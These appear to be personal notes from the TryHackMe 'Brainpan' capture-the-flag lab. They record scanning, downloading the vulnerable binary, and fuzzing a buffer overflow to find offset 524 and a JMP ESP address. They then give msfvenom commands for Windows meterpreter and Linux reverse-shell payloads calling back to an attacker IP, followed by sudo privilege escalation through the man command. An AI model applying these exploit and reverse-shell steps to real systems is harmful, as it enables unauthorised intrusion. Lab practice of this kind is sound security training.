# brainpanTHM
brainpan machine exploit
nmap scan: simple http server on python: port10000 + 9999 port abyss app
gobuster scan: /bin directory - prainpan.exe file => buffer overflow?

 get exe onto own machine: wget http://10.10.3.217:10000/bin/brainpan.exe
 actualy to windows machine:  certutil -urlcache -f http://10.10.3.217:10000/bin/brainpan.exe
 
 nc 10.10.3.217 9999  
 bash```                                                                                                                                                                                                                2 ⨯
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> qsq
                          ACCESS DENIED

```

rdesktop -u admin -p password 10.10.55.35

> fuzzing at 600 bytes crashed the app
> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000 < for payload 400 bigger than succeeded fuzzing value
> !mona findmsp -distance 1000
> found offset 524 
> no badchars
> ESP -> “\xf3\x12\x17\x31”
> payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.2.34 LPORT=1234 EXITFUNC=thread -b "\x00" -f c
> paylaod for brainpan machine: msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.2.34 LPORT=1234 EXITFUNC=thread -b "\x00" -f c

in machine:
sudo -l -> sudo /home/anansi/bin/anansi_util -> gtfobins via man command privesc
